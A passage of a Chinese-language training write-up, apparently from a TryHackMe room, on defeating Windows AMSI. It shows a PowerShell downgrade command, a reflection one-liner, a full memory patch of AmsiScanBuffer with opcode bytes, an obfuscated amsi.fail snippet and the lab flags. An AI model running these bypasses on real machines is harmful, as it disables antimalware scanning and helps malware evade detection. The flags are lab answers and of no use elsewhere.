\u4f1a\u88ab\u5b9e\u73b0\u5417\uff1f(Y/N)"}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"N\n"})})]}),"\n",(0,s.jsx)(n.h2,{id:"powershell-downgrade---powershell-\u964d\u7ea7\u653b\u51fb",children:"PowerShell Downgrade - PowerShell \u964d\u7ea7\u653b\u51fb"}),"\n",(0,s.jsx)(n.p,{children:"PowerShell \u964d\u7ea7\u653b\u51fb\u662f\u4e00\u79cd\u975e\u5e38\u7b80\u5355\u7684\u653b\u51fb\u65b9\u5f0f\uff0c\u5b83\u5141\u8bb8\u653b\u51fb\u8005\u4fee\u6539\u5f53\u524d\u7684 PowerShell \u7248\u672c\u4ee5\u79fb\u9664\u5b89\u5168\u529f\u80fd\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u5927\u591a\u6570 PowerShell \u4f1a\u8bdd\u4f1a\u542f\u52a8\u6700\u65b0\u7684 PowerShell \u5f15\u64ce\uff0c\u4f46\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e00\u884c\u547d\u4ee4\u624b\u52a8\u66f4\u6539\u7248\u672c\u3002\u901a\u8fc7\u5c06 PowerShell \u7248\u672c\u964d\u7ea7\u5230 2.0\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u5b89\u5168\u529f\u80fd\uff0c\u56e0\u4e3a\u76f4\u5230\u7248\u672c 5.0 \u624d\u5b9e\u73b0\u4e86\u8fd9\u4e9b\u5b89\u5168\u529f\u80fd\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u8be5\u653b\u51fb\u53ea\u9700\u5728\u4f1a\u8bdd\u4e2d\u6267\u884c\u4e00\u884c\u547d\u4ee4\u5373\u53ef\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"-Version"})," \u6807\u5fd7\u542f\u52a8\u4e00\u4e2a\u65b0\u7684 PowerShell \u8fdb\u7a0b\uff0c\u6307\u5b9a\u7248\u672c\uff082\uff09\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"PowerShell -Version 2\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8be5\u653b\u51fb\u53ef\u4ee5\u5728\u50cf ",(0,s.jsx)(n.a,{href:"https://github.com/trustedsec/unicorn",children:"Unicorn"})," \u8fd9\u6837\u7684\u5de5\u5177\u4e2d\u770b\u5230\u5b9e\u9645\u7684\u5229\u7528\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"full_attack = '''powershell /w 1 /C \"sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + \")\" + '\"'\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7531\u4e8e\u8be5\u653b\u51fb\u5982\u6b64\u7b80\u5355\u4e14\u6613\u4e8e\u5b9e\u65bd\uff0c\u84dd\u961f\u6709\u8bb8\u591a\u65b9\u6cd5\u53ef\u4ee5\u68c0\u6d4b\u548c\u7f13\u89e3\u6b64\u653b\u51fb\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u4e24\u79cd\u6700\u7b80\u5355\u7684\u7f13\u89e3\u63aa\u65bd\u662f\u4ece\u8bbe\u5907\u4e2d\u79fb\u9664 PowerShell 2.0 \u5f15\u64ce\uff0c\u5e76\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u963b\u6b62\u5217\u8868\u62d2\u7edd\u8bbf\u95ee PowerShell 2.0\u3002"}),"\n",(0,s.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,s.jsx)(n.p,{children:"\u5728 cmd.exe \u4e2d\u6267\u884c\u547d\u4ee4\u540e\uff0c\u8f93\u5165\u4ece\u684c\u9762\u83b7\u5f97\u7684\u6807\u5fd7\u3002"}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"THM{p0w3r5h3ll_d0wn6r4d3!}\n"})})]}),"\n",(0,s.jsx)(n.h2,{id:"powershell-reflection---powershell-\u53cd\u5c04",children:"PowerShell Reflection - PowerShell \u53cd\u5c04"}),"\n",(0,s.jsx)(n.p,{children:"\u53cd\u5c04\u5141\u8bb8\u7528\u6237\u6216\u7ba1\u7406\u5458\u8bbf\u95ee\u5e76\u4e0e .NET \u7a0b\u5e8f\u96c6\u8fdb\u884c\u4ea4\u4e92\u3002\u6839\u636e\u5fae\u8f6f\u6587\u6863\uff0c\u201c\u7a0b\u5e8f\u96c6\u662f .NET \u5e94\u7528\u7a0b\u5e8f\u5728\u90e8\u7f72\u3001\u7248\u672c\u63a7\u5236\u3001\u91cd\u7528\u3001\u6fc0\u6d3b\u8303\u56f4\u548c\u5b89\u5168\u6743\u9650\u65b9\u9762\u7684\u57fa\u672c\u5355\u4f4d\u3002\u201d .NET \u7a0b\u5e8f\u96c6\u53ef\u80fd\u770b\u8d77\u6765\u5f88\u964c\u751f\uff1b\u7136\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u77e5\u9053\u5b83\u4eec\u4ee5\u5e38\u89c1\u683c\u5f0f\uff08\u5982 exe\uff08\u53ef\u6267\u884c\u6587\u4ef6\uff09\u548c dll\uff08\u52a8\u6001\u94fe\u63a5\u5e93\uff09\uff09\u5448\u73b0\u7684\u65b9\u5f0f\uff0c\u4f7f\u5b83\u4eec\u66f4\u52a0\u719f\u6089\u3002"}),"\n",(0,s.jsx)(n.p,{children:"PowerShell \u53cd\u5c04\u53ef\u4ee5\u88ab\u6ee5\u7528\u6765\u4fee\u6539\u548c\u8bc6\u522b\u6709\u4ef7\u503c\u7684 DLL \u4fe1\u606f\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["PowerShell \u7684 AMSI \u5de5\u5177\u5b58\u50a8\u5728 ",(0,s.jsx)(n.code,{children:"System.Management.Automation.AmsiUtils"})," \u4e2d\u7684 ",(0,s.jsx)(n.code,{children:"AMSIUtils"})," .NET \u7a0b\u5e8f\u96c6\u4e2d\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"Matt Graeber \u53d1\u5e03\u4e86\u4e00\u4e2a\u4e00\u884c\u547d\u4ee4\uff0c\u7528\u4e8e\u901a\u8fc7\u53cd\u5c04\u4fee\u6539\u548c\u7ed5\u8fc7 AMSI \u5de5\u5177\u3002\u4ee5\u4e0b\u4ee3\u7801\u5757\u5c55\u793a\u4e86\u8fd9\u4e2a\u4e00\u884c\u547d\u4ee4\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4e3a\u4e86\u8bf4\u660e\u4ee3\u7801\u529f\u80fd\uff0c\u6211\u4eec\u5c06\u5176\u5206\u89e3\u6210\u66f4\u5c0f\u7684\u90e8\u5206\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u4ee3\u7801\u7247\u6bb5\u5c06\u8c03\u7528\u53cd\u5c04\u51fd\u6570\uff0c\u5e76\u6307\u5b9a\u5b83\u60f3\u8981\u4f7f\u7528\u6765\u81ea ",(0,s.jsx)(n.code,{children:"[Ref.Assembly]"})," \u7684\u7a0b\u5e8f\u96c6\u3002\u63a5\u7740\uff0c\u5b83\u5c06\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"GetType"})," \u83b7\u53d6 AMSI \u5de5\u5177\u7684\u7c7b\u578b\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u4ece\u4e0a\u4e00\u90e8\u5206\u6536\u96c6\u7684\u4fe1\u606f\u5c06\u88ab\u4f20\u9012\u5230\u4e0b\u4e00\u4e2a\u51fd\u6570\uff0c\u901a\u8fc7 ",(0,s.jsx)(n.code,{children:"GetField"})," \u83b7\u53d6\u7a0b\u5e8f\u96c6\u4e2d\u7684\u6307\u5b9a\u5b57\u6bb5\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:".GetField('amsiInitFailed','NonPublic,Static')\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7a0b\u5e8f\u96c6\u548c\u5b57\u6bb5\u4fe1\u606f\u5c06\u88ab\u4f20\u9012\u5230\u4e0b\u4e00\u4e2a\u53c2\u6570\uff0c\u901a\u8fc7 ",(0,s.jsx)(n.code,{children:"SetValue"})," \u5c06\u503c\u4ece ",(0,s.jsx)(n.code,{children:"$false"})," \u8bbe\u7f6e\u4e3a ",(0,s.jsx)(n.code,{children:"$true"}),"\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:".SetValue($null,$true)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u4e00\u65e6 ",(0,s.jsx)(n.code,{children:"amsiInitFailed"})," \u5b57\u6bb5\u88ab\u8bbe\u7f6e\u4e3a ",(0,s.jsx)(n.code,{children:"$true"}),"\uff0cAMSI \u5c06\u4ee5\u54cd\u5e94\u4ee3\u7801 AMSI_RESULT_NOT_DETECTED = 1 \u505a\u51fa\u54cd\u5e94\u3002"]}),"\n",(0,s.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,s.jsx)(n.p,{children:"\u9605\u8bfb\u4ee5\u4e0a\u5185\u5bb9\u5e76\u5728\u63d0\u4f9b\u7684\u673a\u5668\u4e0a\u7ec3\u4e60\u5229\u7528\u4e00\u884c\u547d\u4ee4\u3002\r\n\u8981\u5229\u7528\u8fd9\u884c\u547d\u4ee4\uff0c\u60a8\u53ef\u4ee5\u5728\u4e0e\u76ee\u6807\u6076\u610f\u4ee3\u7801\u76f8\u540c\u7684\u4f1a\u8bdd\u4e2d\u8fd0\u884c\u5b83\uff0c\u6216\u5c06\u5176\u9884\u5148\u6dfb\u52a0\u5230\u6076\u610f\u4ee3\u7801\u4e4b\u524d\u3002"}),(0,s.jsx)(n.p,{children:"\u6267\u884c\u547d\u4ee4\u540e\uff0c\u8f93\u5165\u4ece\u684c\u9762\u83b7\u5f97\u7684\u6807\u5fd7\u3002"}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"THM{r3fl3c7_4ll_7h3_7h1n65}\n"})})]}),"\n",(0,s.jsx)(n.h2,{id:"patching-amsi---\u4fee\u8865-amsi",children:"Patching AMSI - \u4fee\u8865 AMSI"}),"\n",(0,s.jsxs)(n.p,{children:["AMSI \u4e3b\u8981\u4ece ",(0,s.jsx)(n.code,{children:"amsi.dll"})," \u4e2d\u8fdb\u884c\u52a0\u8f7d\u548c\u5de5\u5177\u5316\uff1b\u8fd9\u4e00\u70b9\u53ef\u4ee5\u4ece\u6211\u4eec\u4e4b\u524d\u89c2\u5bdf\u5230\u7684\u56fe\u8868\u4e2d\u786e\u8ba4\u3002\u6211\u4eec\u53ef\u4ee5\u6ee5\u7528\u8be5 DLL \u5e76\u5f3a\u5236\u5b83\u6307\u5411\u6211\u4eec\u60f3\u8981\u7684\u54cd\u5e94\u4ee3\u7801\u3002",(0,s.jsx)(n.code,{children:"AmsiScanBuffer"})," \u51fd\u6570\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u6240\u9700\u7684\u94a9\u5b50\u548c\u529f\u80fd\uff0c\u5141\u8bb8\u6211\u4eec\u8bbf\u95ee\u6307\u5411\u54cd\u5e94\u4ee3\u7801\u7684\u6307\u9488/\u7f13\u51b2\u533a\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"AmsiScanBuffer"})," \u662f\u8106\u5f31\u7684\uff0c\u56e0\u4e3a ",(0,s.jsx)(n.code,{children:"amsi.dll"})," \u5728 PowerShell \u8fdb\u7a0b\u542f\u52a8\u65f6\u5c31\u88ab\u52a0\u8f7d\uff1b\u56e0\u6b64\uff0c\u6211\u4eec\u7684\u4f1a\u8bdd\u5177\u6709\u4e0e\u8be5\u5de5\u5177\u76f8\u540c\u7684\u6743\u9650\u7ea7\u522b\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"AmsiScanBuffer"})," \u4f1a\u626b\u63cf\u4e00\u4e2a\u201c",(0,s.jsx)(n.a,{href:"https://en.wikipedia.org/wiki/Data_buffer",children:"\u7f13\u51b2\u533a"}),"\u201d\u7684\u53ef\u7591\u4ee3\u7801\uff0c\u5e76\u5c06\u5176\u62a5\u544a\u7ed9 ",(0,s.jsx)(n.code,{children:"amsi.dll"}),"\uff0c\u4ee5\u786e\u5b9a\u54cd\u5e94\u3002\u5982\u679c\u6211\u4eec\u63a7\u5236\u4e86\u8fd9\u4e2a\u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u8986\u76d6\u7f13\u51b2\u533a\u5e76\u8fd4\u56de\u5e72\u51c0\u7684\u54cd\u5e94\u4ee3\u7801\u3002\u4e3a\u4e86\u8bc6\u522b\u6240\u9700\u7684\u7f13\u51b2\u533a\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u9006\u5411\u5de5\u7a0b\uff1b\u5e78\u8fd0\u7684\u662f\uff0c\u8fd9\u4e9b\u7814\u7a76\u548c\u9006\u5411\u5de5\u7a0b\u5df2\u7ecf\u5b8c\u6210\u3002\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u6240\u9700\u7684\u786e\u5207\u8fd4\u56de\u4ee3\u7801\uff0c\u7528\u4e8e\u83b7\u53d6\u5e72\u51c0\u7684\u54cd\u5e94\uff01"]}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u5c06\u5206\u89e3\u7531 BC-Security \u4fee\u6539\u5e76\u53d7\u5230 Tal Liberman \u542f\u53d1\u7684\u4ee3\u7801\u7247\u6bb5\uff1b\u60a8\u53ef\u4ee5\u5728",(0,s.jsx)(n.a,{href:"https://github.com/BC-SECURITY/Empire/blob/master/empire/server/common/bypasses.py",children:"\u8fd9\u91cc"}),"\u627e\u5230\u539f\u59cb\u4ee3\u7801\u3002RastaMouse \u4e5f\u6709\u4e00\u4e2a\u7c7b\u4f3c\u7684 C# \u7ed5\u8fc7\u4ee3\u7801\uff0c\u4f7f\u7528\u76f8\u540c\u7684\u6280\u672f\uff0c\u60a8\u53ef\u4ee5\u5728",(0,s.jsx)(n.a,{href:"https://github.com/rasta-mouse/AmsiScanBufferBypass",children:"\u8fd9\u91cc"}),"\u627e\u5230\u5b83\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u4ece\u9ad8\u5c42\u6b21\u4e0a\u8bb2\uff0cAMSI \u4fee\u8865\u53ef\u4ee5\u5206\u4e3a\u56db\u4e2a\u6b65\u9aa4\uff1a"}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:["\u83b7\u53d6 ",(0,s.jsx)(n.code,{children:"amsi.dll"})," \u7684\u53e5\u67c4"]}),"\n",(0,s.jsxs)(n.li,{children:["\u83b7\u53d6 ",(0,s.jsx)(n.code,{children:"AmsiScanBuffer"})," \u7684\u8fdb\u7a0b\u5730\u5740"]}),"\n",(0,s.jsxs)(n.li,{children:["\u4fee\u6539 ",(0,s.jsx)(n.code,{children:"AmsiScanBuffer"})," \u7684\u5185\u5b58\u4fdd\u62a4"]}),"\n",(0,s.jsxs)(n.li,{children:["\u5411 ",(0,s.jsx)(n.code,{children:"AmsiScanBuffer"})," \u5199\u5165\u64cd\u4f5c\u7801"]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u9996\u5148\u9700\u8981\u52a0\u8f7d\u4efb\u4f55\u5916\u90e8\u5e93\u6216 API \u8c03\u7528\uff0c\u6211\u4eec\u5c06\u4ece ",(0,s.jsx)(n.strong,{children:"kernel32"})," \u52a0\u8f7d ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress",children:"GetProcAddress"}),"\u3001",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea",children:"GetModuleHandle"})," \u548c ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect",children:"VirtualProtect"}),"\uff0c\u4f7f\u7528 ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke",children:"p/invoke"}),"\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-csharp",children:'[DllImport(`"kernel32`")] // Import DLL where API call is stored\r\npublic static extern IntPtr GetProcAddress( // API Call to import\r\n\tIntPtr hModule, // Handle to DLL module\r\n\tstring procName // function or variable to obtain\r\n);\r\n\r\n[DllImport(`"kernel32`")]\r\npublic static extern IntPtr GetModuleHandle(\r\n\tstring lpModuleName // Module to obtain handle\r\n);\r\n\r\n[DllImport(`"kernel32`")]\r\npublic static extern bool VirtualProtect(\r\n\tIntPtr lpAddress, // Address of region to modify\r\n\tUIntPtr dwSize, // Size of region\r\n\tuint flNewProtect, // Memory protection options\r\n\tout uint lpflOldProtect // Pointer to store previous protection options\r\n); \n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e9b\u51fd\u6570\u73b0\u5728\u5df2\u7ecf\u5b9a\u4e49\uff0c\u4f46\u6211\u4eec\u9700\u8981\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"Add-Type"})," \u6765\u52a0\u8f7d\u8fd9\u4e9b API \u8c03\u7528\u3002\u8fd9\u4e2a cmdlet \u5c06\u4ee5\u9002\u5f53\u7684\u7c7b\u578b\u548c\u547d\u540d\u7a7a\u95f4\u52a0\u8f7d\u8fd9\u4e9b\u51fd\u6570\uff0c\u4ece\u800c\u4f7f\u5f97\u53ef\u4ee5\u8c03\u7528\u5b83\u4eec\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u8c03\u7528 API \u51fd\u6570\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a ",(0,s.jsx)(n.code,{children:"amsi.dll"})," \u7684\u4f4d\u7f6e\u4ee5\u53ca\u5982\u4f55\u8bbf\u95ee\u8be5\u51fd\u6570\u3002\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"GetModuleHandle"})," \u6765\u83b7\u53d6 AMSI \u7684\u8fdb\u7a0b\u53e5\u67c4\u3002\u7136\u540e\uff0c\u8fd9\u4e2a\u53e5\u67c4\u5c06\u7528\u4e8e\u901a\u8fc7 ",(0,s.jsx)(n.code,{children:"GetProcAddress"})," \u83b7\u53d6 ",(0,s.jsx)(n.code,{children:"AmsiScanBuffer"})," \u7684\u8fdb\u7a0b\u5730\u5740\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-csharp",children:"$handle = [Win32.Kernel32]::GetModuleHandle(\r\n\t'amsi.dll' // Obtains handle to amsi.dll\r\n);\r\n[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(\r\n\t$handle, // Handle of amsi.dll\r\n\t'AmsiScanBuffer' // API call to obtain\r\n); \n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u9700\u8981\u4fee\u6539 ",(0,s.jsx)(n.code,{children:"AmsiScanBuffer"})," \u8fdb\u7a0b\u533a\u57df\u7684\u5185\u5b58\u4fdd\u62a4\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",(0,s.jsx)(n.code,{children:"VirtualProtect"})," \u6765\u6307\u5b9a\u53c2\u6570\u548c\u7f13\u51b2\u533a\u5730\u5740\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u5173\u4e8e\u8fd9\u4e9b\u53c2\u6570\u53ca\u5176\u503c\u7684\u4fe1\u606f\u53ef\u4ee5\u5728\u4e4b\u524d\u63d0\u5230\u7684 API \u6587\u6863\u4e2d\u627e\u5230\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-csharp",children:"[UInt32]$Size = 0x5; // Size of region\r\n[UInt32]$ProtectFlag = 0x40; // PAGE_EXECUTE_READWRITE\r\n[UInt32]$OldProtectFlag = 0; // Arbitrary value to store options\r\n[Win32.Kernel32]::VirtualProtect(\r\n\t$BufferAddress, // Point to AmsiScanBuffer\r\n\t$Size, // Size of region\r\n\t$ProtectFlag, // Enables R or RW access to region\r\n\t[Ref]$OldProtectFlag // Pointer to store old options\r\n); \n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u9700\u8981\u6307\u5b9a\u8981\u8986\u76d6\u7f13\u51b2\u533a\u7684\u5185\u5bb9\uff1b\u8bc6\u522b\u8be5\u7f13\u51b2\u533a\u7684\u8fc7\u7a0b\u53ef\u4ee5\u5728",(0,s.jsx)(n.a,{href:"https://rastamouse.me/memory-patching-amsi-bypass/",children:"\u8fd9\u91cc"}),"\u627e\u5230\u3002\u4e00\u65e6\u6307\u5b9a\u4e86\u7f13\u51b2\u533a\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-6.0",children:"marshal copy"})," \u5c06\u6570\u636e\u5199\u5165\u8fdb\u7a0b\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-csharp",children:"$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);\r\n\r\n[system.runtime.interopservices.marshal]::copy(\r\n\t$buf, // Opcodes/array to write\r\n\t0, // Where to start copying in source array \r\n\t$BufferAddress, // Where to write (AsmiScanBuffer)\r\n\t6 // Number of elements/opcodes to write\r\n); \n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5230\u6b64\u9636\u6bb5\uff0c\u6211\u4eec\u5e94\u8be5\u5df2\u7ecf\u5b9e\u73b0\u4e86\u4e00\u4e2a\u6709\u6548\u7684AMSI\u7ed5\u8fc7\uff01\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5927\u591a\u6570\u5de5\u5177\u4f1a\u8bbe\u8ba1\u7279\u5b9a\u7684\u7b7e\u540d\u548c\u68c0\u6d4b\u673a\u5236\uff0c\u4ee5\u8bc6\u522b\u6b64\u7c7b\u811a\u672c\u3002"}),"\n",(0,s.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,s.jsx)(n.p,{children:"\u9605\u8bfb\u4ee5\u4e0a\u5185\u5bb9\u5e76\u5728\u63d0\u4f9b\u7684\u673a\u5668\u4e0a\u6267\u884c/\u89c2\u5bdf\u811a\u672c\u3002"}),(0,s.jsx)(n.p,{children:"\u6267\u884c\u547d\u4ee4\u540e\uff0c\u8f93\u5165\u4ece\u684c\u9762\u83b7\u53d6\u7684\u6807\u5fd7\u3002"}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"THM{p47ch1n6_15n7_ju57_f0r_7h3_600d_6uy5}\n"})})]}),"\n",(0,s.jsx)(n.h2,{id:"automating-for-fun-and-profit---\u81ea\u52a8\u5316\u7684\u4e50\u8da3\u4e0e\u5229\u6da6",children:"Automating for Fun and Profit - \u81ea\u52a8\u5316\u7684\u4e50\u8da3\u4e0e\u5229\u6da6"}),"\n",(0,s.jsx)(n.p,{children:"\u867d\u7136\u5efa\u8bae\u4f7f\u7528\u672c\u623f\u95f4\u4e2d\u5c55\u793a\u7684\u524d\u51e0\u79cd\u65b9\u6cd5\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u81ea\u52a8\u5316\u5de5\u5177\u6765\u6253\u7834 AMSI \u7b7e\u540d\u6216\u7f16\u8bd1\u7ed5\u8fc7\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u5c06\u9996\u5148\u67e5\u770b\u7684\u81ea\u52a8\u5316\u5de5\u5177\u662f ",(0,s.jsx)(n.a,{href:"http://amsi.fail/",children:"amsi.fail"})]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.a,{href:"http://amsi.fail/",children:"amsi.fail"})," \u5c06\u4ece\u4e00\u7cfb\u5217\u5df2\u77e5\u7684\u7ed5\u8fc7\u65b9\u6cd5\u4e2d\u7f16\u8bd1\u5e76\u751f\u6210\u4e00\u4e2a PowerShell \u7ed5\u8fc7\u4ee3\u7801\u3002\u6839\u636e amsi.fail \u7684\u63cf\u8ff0\uff1a\u201cAMSI.fail \u751f\u6210\u6df7\u6dc6\u7684 PowerShell \u4ee3\u7801\u7247\u6bb5\uff0c\u8fd9\u4e9b\u7247\u6bb5\u53ef\u4ee5\u6253\u7834\u6216\u7981\u7528\u5f53\u524d\u8fdb\u7a0b\u7684 AMSI\u3002\u4ee3\u7801\u7247\u6bb5\u4ece\u4e00\u4e2a\u5c0f\u6c60\u4e2d\u968f\u673a\u9009\u62e9\u6280\u672f/\u53d8\u4f53\uff0c\u7136\u540e\u8fdb\u884c\u6df7\u6dc6\u3002\u6bcf\u4e2a\u7247\u6bb5\u5728\u8fd0\u884c\u65f6/\u8bf7\u6c42\u65f6\u8fdb\u884c\u6df7\u6dc6\uff0c\u4ee5\u786e\u4fdd\u751f\u6210\u7684\u6bcf\u4e2a\u8f93\u51fa\u90fd\u4e0d\u5171\u4eab\u76f8\u540c\u7684\u7b7e\u540d\u3002\u201d"]}),"\n",(0,s.jsx)(n.p,{children:"\u4e0b\u9762\u662f\u6765\u81ea amsi.fail \u7684\u4e00\u4e2a\u6df7\u6dc6 PowerShell \u4ee3\u7801\u7247\u6bb5\u793a\u4f8b\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"$d=$null;$qcgcjblv=[$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).Runtime.InteropServices.Marshal]::AllocHGlobal((9076+7561-7561));$pkgzwpahfwntq=\"+('lwbj'+'cymh').NORmaliZe([CHar]([byTe]0x46)+[char](111)+[ChAR]([ByTE]0x72)+[chaR](109*73/73)+[ChAR]([ByTE]0x44)) -replace [char]([bytE]0x5c)+[Char](112*106/106)+[char]([bYte]0x7b)+[chAR]([BYtE]0x4d)+[CHAR](110+8-8)+[CHAr]([BytE]0x7d)\";[Threading.Thread]::Sleep(1595);[Ref].Assembly.GetType(\"$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$(('M\xe3n\xe2ge'+'ment').NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$(('\xc0ut\xf5m\xe2t\xee'+'\xf4n').NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))\").GetField(\"$(('\xe0ms\xed'+'Sess'+'\xed\xf3n').norMALiZE([CHaR](70*49/49)+[chAr](87+24)+[ChaR]([bytE]0x72)+[chAr](109)+[chAR](68+43-43)) -replace [CHAr](92)+[chAr]([byTe]0x70)+[CHAr]([bYTE]0x7b)+[cHAr](77*71/71)+[CHar]([bYtE]0x6e)+[char](125+49-49))\", \"NonPublic,Static\").SetValue($d, $null);[Ref].Assembly.GetType(\"$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace 